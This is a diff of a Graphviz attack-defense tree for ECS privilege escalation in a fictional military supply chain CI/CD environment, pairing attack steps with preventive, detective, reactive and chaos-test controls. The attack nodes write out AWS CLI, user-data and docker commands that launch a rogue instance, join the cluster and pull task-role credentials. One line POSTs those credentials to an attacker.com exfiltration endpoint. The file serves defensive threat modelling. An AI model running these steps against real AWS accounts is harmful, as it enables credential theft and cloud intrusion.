@@ -1,4 +1,4 @@
-digraph AttackDefenseTree {
+digraph AttackGraph {
     graph [
         fontname="Arial",
         splines=ortho,
@@ -6,417 +6,444 @@ digraph AttackDefenseTree {
         ranksep=0.75,
         rankdir=TB,
         ordering="out",
-        compound=true,
-        label="ECS Privilege Escalation Attack-Defense Tree\nDefense Supply Chain Management System",
-        labelloc="t",
-        fontsize=16
+        compound=true
     ];
     node [fontname="Arial"];
 
-    // ============================================================================
-    // ROOT NODE
-    // ============================================================================
-    "Root_Node" [label="Root Node: Compromised IAM Credentials\nDefense Supply Chain CI/CD Environment",
+    "Root_Node" [label="Root Node: Military Supply Chain CI/CD Environment\nEC2-based DevSecOps Infrastructure",
+        shape=rectangle, style=filled, fillcolor="#C6E8D1", fontcolor="black"];
+    
+    "Final_Node" [label="Final Attack Goal: Elevation of Privilege + Information Disclosure\nSTRIDE: Compromised ECS Task Role Credentials\nImpact: Access to classified supply chain data and deployment pipelines",
         shape=rectangle, style=filled, fillcolor="#C6E8D1", fontcolor="black"];
 
     // ============================================================================
-    // BRANCH 1: CREATE USER DATA SCRIPT FOR ECS CLUSTER REGISTRATION
+    // ATTACK STEP 1: Launch EC2 Instance with ECS Configuration
     // ============================================================================
-    
-    "1.0-Preventive" [
+
+    "1.1-Preventive" [
         shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
         label=<
-            <b>1.0 Preventive: IAM Permission Boundaries &amp; Least Privilege</b><br/>
+            <b>1.1 Preventive: Block Unauthorized EC2 Launch</b><br/>
             <b>Classification: Preventive</b><br/>
-            <b>Description:</b> Enforce strict IAM policies preventing unauthorized ec2:RunInstances<br/>
-            and iam:PassRole permissions. Implement permission boundaries on all CI/CD roles<br/>
-            to prevent privilege escalation. Use Service Control Policies (SCPs) to deny<br/>
-            EC2 instance launches outside approved AMI IDs and instance profiles.<br/>
-            <b>AWS Services:</b> IAM, AWS Organizations (SCPs), IAM Access Analyzer<br/>
-            <b>Implementation:</b> Deny ec2:RunInstances unless AMI matches approved golden AMI list.<br/>
-            Deny iam:PassRole unless target role is in approved ECS instance profile whitelist.<br/>
+            <b>Controls:</b><br/>
+            • Service Catalog enforcement - Only approved EC2 configurations via catalog<br/>
+            • SCP denying ec2:RunInstances outside approved patterns<br/>
+            • IAM permissions boundaries preventing iam:PassRole to ECS profiles<br/>
+            • Require MFA for ec2:RunInstances API calls<br/>
+            • Approved AMI whitelist via AWS Config rule (block non-golden AMIs)<br/>
+            • VPC endpoint policies restricting EC2 API access<br/>
+            • Session Manager-only access (SSH keys disabled org-wide)<br/>
+            <b>Scenario Context:</b> CI/CD pipeline uses immutable infrastructure;<br/>
+            manual EC2 launches are prohibited for supply chain security
         >, margin=0.2
     ];
 
-    "1.1-Attack" [
+    "1.2-Attack" [
         shape=rectangle, style=filled, fillcolor="#F40B0B", fontcolor="white",
         label=<
-            <b>1.1 Attack: Create User Data Script for ECS Cluster Registration</b><br/>
-            <b>Command:</b> cat &gt; /tmp/asd.sh &lt;&lt; 'EOF'<br/>
+            <b>1.2 Attack: Launch Malicious EC2 Instance</b><br/>
+            <b>Command:</b><br/>
+            aws ec2 run-instances \<br/>
+            &#160;&#160;--image-id ami-07fde2ae86109a2af \<br/>
+            &#160;&#160;--instance-type t2.micro \<br/>
+            &#160;&#160;--iam-instance-profile ECS_SupplyChain_Role \<br/>
+            &#160;&#160;--count 1 --key-name attacker_key \<br/>
+            &#160;&#160;--subnet-id subnet-private-cicd \<br/>
+            &#160;&#160;--security-group-ids sg-ecs-cluster \<br/>
+            &#160;&#160;--user-data file:///tmp/ecs_join.sh<br/>
+            <b>Dependencies:</b><br/>
+            • Compromised IAM credentials with ec2:RunInstances<br/>
+            • iam:PassRole permission for ECS instance profile<br/>
+            • Knowledge of ECS-optimized AMI in region<br/>
+            • Access to create/upload SSH key pair<br/>
+            • Network access to EC2 API endpoints<br/>
+            • User data script to join ECS cluster<br/>
+            <b>Result:</b><br/>
+            Rogue EC2 instance launched in supply chain VPC with ECS agent,<br/>
+            configured to auto-register to military logistics ECS cluster.<br/>
+            Instance has IAM profile granting ECS registration permissions.<br/>
+            <b>TTP:</b> T1078.004 - Valid Accounts: Cloud Accounts<br/>
+            <b>Scenario Impact:</b> Compromises CI/CD deployment infrastructure;<br/>
+            potential access to classified supply chain container workloads
+        >, margin=0.2
+    ];
+
+    "1.3-Chaos" [
+        shape=rectangle, style="filled,rounded,bold", fillcolor="#FC8600", color="#FFA500", fontcolor="#000000",
+        label=<
+            <b>1.3 SCE Experiment: EC2 Launch Chaos Test</b><br/>
+            <b>Preventive Probe:</b><br/>
+            • Attempt ec2:RunInstances with non-whitelisted AMI → Expect SCP denial<br/>
+            • Try launching without Service Catalog → Expect IAM permission error<br/>
+            • Attempt iam:PassRole to ECS profile without MFA → Expect MFA challenge<br/>
+            • Launch with SSH key in user data → Expect Config rule violation alert<br/>
+            <b>Detective Probe:</b><br/>
+            • Simulate successful launch → Verify GuardDuty alert within 60 seconds<br/>
+            • Check CloudTrail event appears in SIEM within 2 minutes<br/>
+            • Confirm Config rule detects non-compliant instance within 5 minutes<br/>
+            • Validate Security Hub finding generated with CRITICAL severity<br/>
+            <b>Reactive Probe:</b><br/>
+            • Trigger automated isolation → Verify security group modified within 30 sec<br/>
+            • Confirm instance termination workflow initiated within 2 minutes<br/>
+            • Validate IAM credential revocation for launching principal<br/>
+            • Check incident ticket created in ServiceNow with forensic snapshot
+        >, margin=0.2
+    ];
+
+    "1.4-Detective" [
+        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
+        label=<
+            <b>1.4 Detective: Detect Unauthorized EC2 Launch</b><br/>
+            <b>Classification: Detective</b><br/>
+            <b>Controls:</b><br/>
+            • CloudTrail logging of RunInstances API call with full request parameters<br/>
+            • EventBridge rule matching ec2:RunInstances outside Service Catalog<br/>
+            • GuardDuty detection: UnauthorizedAccess:EC2/MaliciousIPCaller.Custom<br/>
+            • AWS Config rule: ec2-instance-launched-with-unapproved-ami<br/>
+            • Security Hub aggregated finding: Non-compliant EC2 launch detected<br/>
+            • CloudWatch Logs Insights query for anomalous IAM PassRole events<br/>
+            • VPC Flow Logs showing new instance communication patterns<br/>
+            • Inspector scan triggered on new instance detecting vulnerabilities<br/>
+            <b>Scenario Context:</b> SIEM correlation with supply chain access patterns;<br/>
+            alert on EC2 launches during non-maintenance windows
+        >, margin=0.2
+    ];
+
+    "1.5-Reactive" [
+        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
+        label=<
+            <b>1.5 Reactive: Respond to Malicious EC2 Launch</b><br/>
+            <b>Classification: Reactive</b><br/>
+            <b>Controls:</b><br/>
+            • Lambda function triggered by EventBridge:<br/>
+            &#160;&#160;- Modify security group to deny all traffic (isolation)<br/>
+            &#160;&#160;- Create EBS snapshot for forensics<br/>
+            &#160;&#160;- Tag instance with "SECURITY_INCIDENT"<br/>
+            &#160;&#160;- Revoke IAM session of launching principal<br/>
+            • Step Functions workflow:<br/>
+            &#160;&#160;1. Isolate instance (network quarantine)<br/>
+            &#160;&#160;2. Capture memory dump via SSM Run Command<br/>
+            &#160;&#160;3. Notify SOC via SNS (PagerDuty integration)<br/>
+            &#160;&#160;4. Create ServiceNow incident ticket<br/>
+            &#160;&#160;5. Terminate instance after evidence collection<br/>
+            • Automated IAM Access Analyzer scan for privilege escalation paths<br/>
+            • S3 Object Lock on forensic evidence (legal hold)<br/>
+            <b>Scenario Context:</b> DoD Cyber Crime Center notification for<br/>
+            defense supply chain compromise; CMMC incident reporting
+        >, margin=0.2
+    ];
+
+    // ============================================================================
+    // ATTACK STEP 2: Configure EC2 Instance to Join ECS Cluster
+    // ============================================================================
+
+    "2.1-Preventive" [
+        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
+        label=<
+            <b>2.1 Preventive: Block Unauthorized ECS Cluster Registration</b><br/>
+            <b>Classification: Preventive</b><br/>
+            <b>Controls:</b><br/>
+            • ECS cluster with container instance registration approval required<br/>
+            • IAM instance profile with explicit deny for ecs:RegisterContainerInstance<br/>
+            &#160;&#160;from non-approved subnets (resource-based condition)<br/>
+            • VPC endpoint policy for ECS API restricting RegisterContainerInstance<br/>
+            • ECS cluster attribute-based access control (ABAC) requiring specific tags<br/>
+            • AWS Config rule: ecs-container-instance-registered-with-approved-profile<br/>
+            • Network ACLs blocking ECS agent communication from unauthorized subnets<br/>
+            • Systems Manager State Manager enforcing approved ecs.config only<br/>
+            <b>Scenario Context:</b> Supply chain ECS clusters use private endpoints;<br/>
+            only golden AMI instances with cryptographic attestation can join
+        >, margin=0.2
+    ];
+
+    "2.2-Attack" [
+        shape=rectangle, style=filled, fillcolor="#F40B0B", fontcolor="white",
+        label=<
+            <b>2.2 Attack: Register Rogue Instance to ECS Cluster</b><br/>
+            <b>Command (User Data Script):</b><br/>
             #!/bin/bash<br/>
-            echo ECS_CLUSTER=defense-supply-chain-cluster &gt;&gt; /etc/ecs/ecs.config;<br/>
-            echo ECS_BACKEND_HOST= &gt;&gt; /etc/ecs/ecs.config;<br/>
-            EOF<br/>
-            <b>Dependencies:</b> Local file system access on attacker workstation or compromised<br/>
-            CI/CD EC2 instance. Knowledge of target ECS cluster name (defense-supply-chain-cluster).<br/>
-            <b>Result:</b> Malicious user data script created to auto-register rogue EC2 instance<br/>
-            to production ECS cluster hosting ammunition tracking, medical supply management,<br/>
-            and rations distribution containers.<br/>
-            <b>TTP:</b> T1059.004 - Command and Scripting Interpreter: Unix Shell<br/>
-            <b>Mission Context:</b> Target cluster runs classified supply chain workloads with<br/>
-            access to SECRET-level operational data across global military bases.<br/>
+            echo ECS_CLUSTER=MilitarySupplyChain-Prod &gt;&gt; /etc/ecs/ecs.config<br/>
+            echo ECS_BACKEND_HOST= &gt;&gt; /etc/ecs/ecs.config<br/>
+            echo ECS_ENABLE_TASK_IAM_ROLE=true &gt;&gt; /etc/ecs/ecs.config<br/>
+            echo ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=true &gt;&gt; /etc/ecs/ecs.config<br/>
+            systemctl restart ecs<br/>
+            <b>Dependencies:</b><br/>
+            • Knowledge of target ECS cluster name (reconnaissance)<br/>
+            • ECS agent installed and running (from ECS-optimized AMI)<br/>
+            • Network connectivity to ECS service endpoints (ecs.region.amazonaws.com)<br/>
+            • IAM instance profile with ecs:RegisterContainerInstance permission<br/>
+            • Security group allowing outbound HTTPS to ECS endpoints<br/>
+            • ECS cluster accepting new container instance registrations<br/>
+            <b>Result:</b><br/>
+            Attacker-controlled EC2 instance successfully registers as container<br/>
+            instance in military supply chain ECS cluster. ECS scheduler now<br/>
+            deploys sensitive workloads (inventory management, logistics tracking,<br/>
+            ammunition tracking containers) to compromised instance.<br/>
+            <b>TTP:</b> T1525 - Implant Internal Image<br/>
+            <b>Scenario Impact:</b> Malicious instance infiltrates trusted CI/CD cluster;<br/>
+            positioned to intercept classified supply chain container deployments
         >, margin=0.2
     ];
 
-    "1.2-Detective" [
-        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
-        label=<
-            <b>1.2 Detective: File Integrity Monitoring &amp; Behavioral Analytics</b><br/>
-            <b>Classification: Detective</b><br/>
-            <b>Description:</b> Deploy AIDE/Tripwire on all CI/CD EC2 instances to detect unauthorized<br/>
-            file creation in /tmp directories. CloudWatch Logs Insights queries for suspicious<br/>
-            bash script creation patterns. GuardDuty detects unusual file system activity.<br/>
-            <b>AWS Services:</b> CloudWatch Logs, GuardDuty, Systems Manager (Run Command for FIM)<br/>
-            <b>Detection Logic:</b> Alert on file creation in /tmp with ECS_CLUSTER configuration strings.<br/>
-            Correlate with IAM principal activity to identify compromised credentials.<br/>
-            <b>Alert Threshold:</b> MEDIUM severity - Potential reconnaissance activity detected.<br/>
-        >, margin=0.2
-    ];
-
-    "1.3-Reactive" [
-        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
-        label=<
-            <b>1.3 Reactive: Automated Credential Revocation &amp; Session Termination</b><br/>
-            <b>Classification: Reactive</b><br/>
-            <b>Description:</b> Lambda function triggered by CloudWatch Events immediately revokes<br/>
-            IAM credentials associated with suspicious file creation activity. Terminate active<br/>
-            sessions via STS. Quarantine affected EC2 instance by applying isolation security group.<br/>
-            <b>AWS Services:</b> Lambda, EventBridge, IAM, EC2, SNS<br/>
-            <b>Automated Actions:</b><br/>
-            1. Revoke IAM user access keys or EC2 instance profile credentials<br/>
-            2. Terminate all active sessions for compromised principal<br/>
-            3. Apply sg-quarantine to affected EC2 instance (deny all traffic)<br/>
-            4. Create forensic EBS snapshot for investigation<br/>
-            5. Notify SOC via PagerDuty (MEDIUM severity escalation)<br/>
-            <b>MTTR Target:</b> &lt; 5 minutes from detection to credential revocation<br/>
-        >, margin=0.2
-    ];
-
-    "1.4-Chaos" [
+    "2.3-Chaos" [
         shape=rectangle, style="filled,rounded,bold", fillcolor="#FC8600", color="#FFA500", fontcolor="#000000",
         label=<
-            <b>1.4 Security Chaos Engineering Experiment</b><br/>
-            <b>Preventive Probe:</b> Attempt to create user data script with compromised IAM role<br/>
-            lacking ec2:RunInstances permission. Verify IAM policy denies action with explicit deny.<br/>
-            Expected Result: Access Denied error, CloudTrail logs unauthorized attempt.<br/>
-            <b>Detective Probe:</b> Create benign test script in /tmp with ECS_CLUSTER string on<br/>
-            monitored CI/CD instance. Verify CloudWatch Logs Insights query triggers alert within<br/>
-            2 minutes. Confirm GuardDuty generates finding for unusual file system activity.<br/>
-            Expected Result: Alert generated, visible in Security Hub within SLA.<br/>
-            <b>Reactive Probe:</b> Simulate detection event via EventBridge test event. Verify Lambda<br/>
-            function executes credential revocation, session termination, and quarantine actions.<br/>
-            Confirm forensic snapshot created and SOC notification sent.<br/>
-            Expected Result: All reactive actions complete within 5-minute MTTR target.<br/>
-            <b>Validation Frequency:</b> Monthly chaos drill, quarterly red team exercise<br/>
+            <b>2.3 SCE Experiment: ECS Registration Chaos Test</b><br/>
+            <b>Preventive Probe:</b><br/>
+            • Attempt ECS registration from non-approved subnet → Expect VPC endpoint denial<br/>
+            • Try registration without required ABAC tags → Expect IAM condition failure<br/>
+            • Modify ecs.config with unauthorized cluster name → Expect State Manager revert<br/>
+            • Register instance without cryptographic attestation → Expect cluster rejection<br/>
+            <b>Detective Probe:</b><br/>
+            • Simulate successful registration → Verify ECS event in CloudTrail within 30 sec<br/>
+            • Check EventBridge rule triggers on RegisterContainerInstance API call<br/>
+            • Confirm GuardDuty detects anomalous ECS cluster activity within 2 minutes<br/>
+            • Validate Config rule flags non-compliant container instance within 5 minutes<br/>
+            • Verify Security Hub finding: "Unauthorized ECS container instance registered"<br/>
+            <b>Reactive Probe:</b><br/>
+            • Trigger automated deregistration → Verify ecs:DeregisterContainerInstance called<br/>
+            • Confirm instance moved to quarantine security group within 1 minute<br/>
+            • Validate ECS tasks drained from compromised instance<br/>
+            • Check SOC notification sent with cluster name and instance details
         >, margin=0.2
     ];
 
-    // ============================================================================
-    // BRANCH 2: LAUNCH EC2 INSTANCE WITH ECS CONFIGURATION
-    // ============================================================================
-
-    "2.0-Preventive" [
+    "2.4-Detective" [
         shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
         label=<
-            <b>2.0 Preventive: EC2 Launch Controls &amp; AMI Whitelisting</b><br/>
-            <b>Classification: Preventive</b><br/>
-            <b>Description:</b> Enforce EC2 instance launch restrictions via SCP and IAM policies.<br/>
-            Only allow launches from approved golden AMIs (CIS/STIG hardened, signed by AWS Signer).<br/>
-            Require IMDSv2 enforcement at launch. Deny iam:PassRole for non-approved instance profiles.<br/>
-            Restrict instance launches to approved VPC subnets (private subnets only).<br/>
-            <b>AWS Services:</b> AWS Organizations (SCP), IAM, EC2, AWS Signer<br/>
-            <b>Implementation:</b> SCP denies ec2:RunInstances unless ImageId matches approved AMI list<br/>
-            AND IamInstanceProfile matches approved ECS instance profile ARNs AND IMDSv2 is required.<br/>
-            <b>Approved AMI Pattern:</b> ami-* signed by defense-supply-chain-signer key<br/>
-            <b>Approved Instance Profiles:</b> arn:aws:iam::*:instance-profile/ecs-supply-chain-*<br/>
-        >, margin=0.2
-    ];
-
-    "2.1-Attack" [
-        shape=rectangle, style=filled, fillcolor="#F40B0B", fontcolor="white",
-        label=<
-            <b>2.1 Attack: Launch Malicious EC2 Instance with ECS Configuration</b><br/>
-            <b>Command:</b> aws ec2 run-instances \<br/>
-            --image-id ami-07fde2ae86109a2af \<br/>
-            --instance-type t2.micro \<br/>
-            --iam-instance-profile ecs-supply-chain-cicd-role \<br/>
-            --count 1 --key-name attacker-key \<br/>
-            --user-data "file:///tmp/asd.sh" \<br/>
-            --subnet-id subnet-private-cicd \<br/>
-            --security-group-ids sg-cicd-default<br/>
-            <b>Dependencies:</b> ec2:RunInstances permission, iam:PassRole for ECS instance profile,<br/>
-            Valid ECS-optimized AMI ID, Existing IAM instance profile with ECS permissions<br/>
-            (ecs:RegisterContainerInstance, ecs:DeregisterContainerInstance, ecs:DiscoverPollEndpoint),<br/>
-            SSH key pair for instance access, Network access to ECS cluster endpoint.<br/>
-            <b>Result:</b> Rogue EC2 instance launches in CI/CD private subnet, auto-registers to<br/>
-            defense-supply-chain-cluster. ECS scheduler begins placing ammunition tracking,<br/>
-            medical supply, and rations distribution tasks on compromised instance.<br/>
-            <b>TTP:</b> T1578.002 - Create Cloud Instance<br/>
-            <b>Mission Impact:</b> CRITICAL - Attacker gains foothold in production ECS cluster,<br/>
-            positioned to intercept classified supply chain workloads and extract credentials.<br/>
-        >, margin=0.2
-    ];
-
-    "2.2-Detective" [
-        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
-        label=<
-            <b>2.2 Detective: CloudTrail Analysis &amp; ECS Cluster Monitoring</b><br/>
+            <b>2.4 Detective: Detect Unauthorized ECS Registration</b><br/>
             <b>Classification: Detective</b><br/>
-            <b>Description:</b> Real-time CloudTrail monitoring for ec2:RunInstances API calls.<br/>
-            GuardDuty detects unauthorized EC2 instance launches. AWS Config rules validate<br/>
-            instance compliance (approved AMI, IMDSv2, approved instance profile). ECS cluster<br/>
-            monitoring detects new container instance registrations from unknown IP addresses.<br/>
-            <b>AWS Services:</b> CloudTrail, GuardDuty, Config, ECS, EventBridge, CloudWatch<br/>
-            <b>Detection Logic:</b><br/>
-            1. CloudTrail: Alert on ec2:RunInstances with non-approved AMI ID<br/>
-            2. Config Rule: ec2-approved-amis-by-id (non-compliant = alert)<br/>
-            3. GuardDuty: UnauthorizedAccess:EC2/MaliciousIPCaller.Custom (if known bad IP)<br/>
-            4. ECS API: DescribeContainerInstances - detect new registrations, validate EC2 metadata<br/>
-            5. VPC Flow Logs: Unusual traffic patterns from new instance to ECS endpoints<br/>
-            <b>Alert Threshold:</b> HIGH severity - Unauthorized EC2 instance launch detected<br/>
-            <b>MTTD Target:</b> &lt; 2 minutes from instance launch to alert generation<br/>
+            <b>Controls:</b><br/>
+            • CloudTrail: ecs:RegisterContainerInstance event with source IP analysis<br/>
+            • EventBridge pattern matching:<br/>
+            &#160;&#160;{<br/>
+            &#160;&#160;&#160;&#160;"source": ["aws.ecs"],<br/>
+            &#160;&#160;&#160;&#160;"detail-type": ["AWS API Call via CloudTrail"],<br/>
+            &#160;&#160;&#160;&#160;"detail": {<br/>
+            &#160;&#160;&#160;&#160;&#160;&#160;"eventName": ["RegisterContainerInstance"],<br/>
+            &#160;&#160;&#160;&#160;&#160;&#160;"errorCode": [{"exists": false}]<br/>
+            &#160;&#160;&#160;&#160;}<br/>
+            &#160;&#160;}<br/>
+            • AWS Config rule: ecs-container-instance-unexpected-registration<br/>
+            • GuardDuty finding: Behavior:ECS/AdversaryTactics<br/>
+            • CloudWatch Logs Insights query for ECS agent logs showing new registrations<br/>
+            • ECS cluster CloudWatch metrics: ContainerInstanceCount anomaly detection<br/>
+            • VPC Flow Logs: New instance communicating with ECS endpoints<br/>
+            • Detective: Behavioral analysis of ECS API call patterns<br/>
+            <b>Scenario Context:</b> Correlation with approved deployment schedules;<br/>
+            alert on ECS registrations outside maintenance windows
         >, margin=0.2
     ];
 
-    "2.3-Reactive" [
+    "2.5-Reactive" [
         shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
         label=<
-            <b>2.3 Reactive: Automated Instance Termination &amp; Cluster Isolation</b><br/>
+            <b>2.5 Reactive: Respond to Unauthorized ECS Registration</b><br/>
             <b>Classification: Reactive</b><br/>
-            <b>Description:</b> Step Functions workflow orchestrates immediate response to unauthorized<br/>
-            EC2 instance launch. Deregister rogue container instance from ECS cluster, terminate<br/>
-            EC2 instance, revoke associated IAM credentials, capture forensic data.<br/>
-            <b>AWS Services:</b> Step Functions, Lambda, ECS, EC2, IAM, S3, SNS<br/>
-            <b>Automated Response Workflow:</b><br/>
-            1. ECS DeregisterContainerInstance (force=true) - remove from cluster immediately<br/>
-            2. EC2 CreateSnapshot - capture EBS volumes for forensic analysis<br/>
-            3. EC2 TerminateInstances - destroy rogue instance<br/>
-            4. IAM DeleteAccessKey / EC2 DisassociateIamInstanceProfile - revoke credentials<br/>
-            5. S3 PutObject - store forensic snapshot metadata in immutable bucket<br/>
-            6. SNS Publish - notify SOC and CISO (HIGH severity, PagerDuty escalation)<br/>
-            7. CloudTrail LookupEvents - analyze blast radius of compromised credentials<br/>
-            8. ECS DescribeTasks - identify if any tasks were scheduled on rogue instance<br/>
-            9. If tasks found: trigger container forensic analysis workflow<br/>
-            <b>MTTR Target:</b> &lt; 10 minutes from detection to instance termination<br/>
-            <b>Forensic Preservation:</b> All artifacts stored in S3 with Object Lock (WORM)<br/>
-        >, margin=0.2
-    ];
-
-    "2.4-Chaos" [
-        shape=rectangle, style="filled,rounded,bold", fillcolor="#FC8600", color="#FFA500", fontcolor="#000000",
-        label=<
-            <b>2.4 Security Chaos Engineering Experiment</b><br/>
-            <b>Preventive Probe:</b> Attempt to launch EC2 instance with non-approved AMI ID using<br/>
-            test IAM role. Verify SCP denies action. Attempt to pass non-approved instance profile.<br/>
-            Verify IAM policy denies iam:PassRole. Attempt to launch without IMDSv2 enforcement.<br/>
-            Expected Result: All attempts denied, CloudTrail logs show explicit deny decisions.<br/>
-            <b>Detective Probe:</b> Launch approved test EC2 instance in isolated test subnet with<br/>
-            monitoring enabled. Verify CloudTrail event captured within 30 seconds. Confirm Config<br/>
-            rule evaluation triggers within 2 minutes. Simulate ECS container instance registration<br/>
-            from test instance, verify ECS API monitoring detects new registration.<br/>
-            Expected Result: All detection mechanisms trigger alerts within MTTD SLA (2 minutes).<br/>
-            <b>Reactive Probe:</b> Trigger Step Functions workflow with test event simulating unauthorized<br/>
-            instance launch. Verify workflow executes all steps: ECS deregistration, snapshot creation,<br/>
-            instance termination, credential revocation, forensic storage, SOC notification.<br/>
-            Validate forensic snapshot stored in S3 with Object Lock enabled. Confirm PagerDuty alert.<br/>
-            Expected Result: Complete workflow execution within 10-minute MTTR target, all artifacts preserved.<br/>
-            <b>Validation Frequency:</b> Monthly automated chaos test, quarterly red team simulation<br/>
+            <b>Controls:</b><br/>
+            • Lambda function (ECS-Registration-Response):<br/>
+            &#160;&#160;- Call ecs:DeregisterContainerInstance immediately<br/>
+            &#160;&#160;- Set container instance status to DRAINING<br/>
+            &#160;&#160;- Stop all running ECS tasks on compromised instance<br/>
+            &#160;&#160;- Modify security group to block ECS agent communication<br/>
+            • Step Functions workflow (ECS-Incident-Response):<br/>
+            &#160;&#160;1. Deregister container instance from cluster<br/>
+            &#160;&#160;2. Capture ECS agent logs via CloudWatch Logs export<br/>
+            &#160;&#160;3. Snapshot all EBS volumes for forensics<br/>
+            &#160;&#160;4. Analyze running containers for credential extraction<br/>
+            &#160;&#160;5. Revoke all task role credentials via STS:RevokeSession<br/>
+            &#160;&#160;6. Terminate EC2 instance<br/>
+            &#160;&#160;7. Scan cluster for other compromised instances<br/>
+            • Automated notification to DoD Cyber Crime Center<br/>
+            • CMMC incident documentation in compliance system<br/>
+            <b>Scenario Context:</b> Critical supply chain cluster compromise;<br/>
+            immediate containment to prevent classified data exfiltration
         >, margin=0.2
     ];
 
     // ============================================================================
-    // BRANCH 3: ACCESS CONTAINERS AND EXTRACT ECS TASK ROLE CREDENTIALS
+    // ATTACK STEP 3: Access ECS Task Containers and Extract IAM Credentials
     // ============================================================================
 
-    "3.0-Preventive" [
+    "3.1-Preventive" [
         shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
         label=<
-            <b>3.0 Preventive: Container Runtime Security &amp; Network Segmentation</b><br/>
+            <b>3.1 Preventive: Block Container Access and Credential Theft</b><br/>
             <b>Classification: Preventive</b><br/>
-            <b>Description:</b> Harden Docker runtime on ECS container instances. Disable SSH access<br/>
-            (use Systems Manager Session Manager only). Implement container runtime security policies<br/>
-            preventing docker exec from host. Use AWS Fargate for sensitive workloads (no host access).<br/>
-            Network segmentation prevents lateral movement from compromised instances.<br/>
-            <b>AWS Services:</b> ECS (Fargate), Systems Manager, Security Groups, NACLs, VPC<br/>
-            <b>Implementation:</b><br/>
-            1. Disable SSH (port 22) via security group rules - use SSM Session Manager only<br/>
-            2. Docker daemon configured with --live-restore=false, --userland-proxy=false<br/>
-            3. AppArmor/SELinux profiles restrict docker exec capabilities<br/>
-            4. ECS task definitions use awsvpc network mode (isolated network namespace)<br/>
-            5. Security groups enforce microsegmentation (task-to-task communication only)<br/>
-            6. NACL rules block metadata service access from container subnets (169.254.169.254/32)<br/>
-            7. Migrate classified workloads to Fargate (no EC2 host access possible)<br/>
-            <b>Critical Workloads on Fargate:</b> Ammunition tracking, medical supply databases<br/>
+            <b>Controls:</b><br/>
+            • Session Manager-only access (SSH/RDP disabled via SCP)<br/>
+            • EC2 Instance Connect disabled organization-wide<br/>
+            • Docker socket access restricted via AppArmor/SELinux profiles<br/>
+            • ECS task IAM roles with credential exposure protection:<br/>
+            &#160;&#160;- Short-lived credentials (15-minute expiration)<br/>
+            &#160;&#160;- IP-based condition keys in task role trust policy<br/>
+            &#160;&#160;- VPC endpoint policy restricting STS:AssumeRole<br/>
+            • Container runtime security (Falco) blocking docker exec commands<br/>
+            • IMDSv2 enforcement preventing SSRF to credential endpoint<br/>
+            • ECS task networking: awsvpc mode with isolated ENIs<br/>
+            • Secrets Manager integration (no environment variable credentials)<br/>
+            • GuardDuty Runtime Monitoring for container process anomalies<br/>
+            <b>Scenario Context:</b> Supply chain containers handle classified data;<br/>
+            zero-trust architecture with credential exposure prevention
         >, margin=0.2
     ];
 
-    "3.1-Attack" [
+    "3.2-Attack" [
         shape=rectangle, style=filled, fillcolor="#F40B0B", fontcolor="white",
         label=<
-            <b>3.1 Attack: Access Containers and Extract ECS Task Role Credentials</b><br/>
-            <b>Command:</b> ssh -i attacker-key.pem ec2-user@&lt;rogue-instance-ip&gt;<br/>
+            <b>3.2 Attack: Extract ECS Task IAM Role Credentials</b><br/>
+            <b>Command:</b><br/>
+            # SSH into compromised EC2 instance<br/>
+            ssh -i attacker_key.pem ec2-user@10.0.1.50<br/>
+            <br/>
+            # List running supply chain containers<br/>
             docker ps<br/>
-            docker exec -it &lt;ammunition-tracking-container-id&gt; /bin/sh<br/>
+            # Output: ammunition-tracker, medical-inventory, rations-mgmt<br/>
+            <br/>
+            # Access ammunition tracking container<br/>
+            docker exec -it ammunition-tracker /bin/bash<br/>
+            <br/>
+            # Extract ECS task role credentials<br/>
             curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI<br/>
-            # Extract credentials for ecs-task-role-ammunition-tracking<br/>
-            # Credentials provide access to:<br/>
-            # - S3 bucket: s3://defense-supply-chain-ammunition-data (SECRET classification)<br/>
-            # - DynamoDB table: ammunition-inventory-global (real-time tracking)<br/>
-            # - RDS database: medical-supplies-db (HIPAA + classified patient data)<br/>
-            <b>Dependencies:</b> SSH access to rogue EC2 instance, ECS tasks scheduled on compromised<br/>
-            instance, Docker runtime access, Network connectivity to AWS metadata service (169.254.170.2).<br/>
-            <b>Result:</b> Attacker extracts IAM credentials for ECS task roles with elevated permissions:<br/>
-            - ecs-task-role-ammunition-tracking (S3, DynamoDB, Secrets Manager access)<br/>
-            - ecs-task-role-medical-supplies (RDS, S3, KMS decrypt for HIPAA data)<br/>
-            - ecs-task-role-rations-distribution (S3, Lambda invoke, SNS publish)<br/>
-            Credentials valid for 1-12 hours (default ECS task role session duration).<br/>
+            # Returns: AccessKeyId, SecretAccessKey, Token, Expiration<br/>
+            <br/>
+            # Exfiltrate credentials<br/>
+            echo $CREDENTIALS | base64 | curl -X POST https://attacker.com/exfil -d @-<br/>
+            <b>Dependencies:</b><br/>
+            • SSH access to compromised EC2 instance (attacker key installed)<br/>
+            • ECS tasks deployed to compromised container instance<br/>
+            • Docker daemon access on EC2 instance<br/>
+            • ECS task roles attached to running containers<br/>
+            • Network connectivity to credential metadata endpoint (169.254.170.2)<br/>
+            • Knowledge of AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable<br/>
+            <b>Result:</b><br/>
+            Attacker extracts temporary IAM credentials for ECS task roles managing:<br/>
+            • Ammunition inventory database (DynamoDB access)<br/>
+            • Medical supply tracking (S3 classified manifests)<br/>
+            • Rations distribution system (RDS with PII/logistics data)<br/>
+            Credentials grant elevated permissions for supply chain operations,<br/>
+            enabling data exfiltration, tampering, and lateral movement.<br/>
             <b>TTP:</b> T1552.005 - Unsecured Credentials: Cloud Instance Metadata API<br/>
-            <b>Mission Impact:</b> CRITICAL - Privilege escalation achieved. Attacker can now:<br/>
-            - Exfiltrate classified ammunition inventory data (SECRET level)<br/>
-            - Access medical supply databases with patient information (HIPAA violation)<br/>
-            - Manipulate rations distribution data (supply chain integrity compromise)<br/>
-            - Pivot to additional AWS services using stolen credentials<br/>
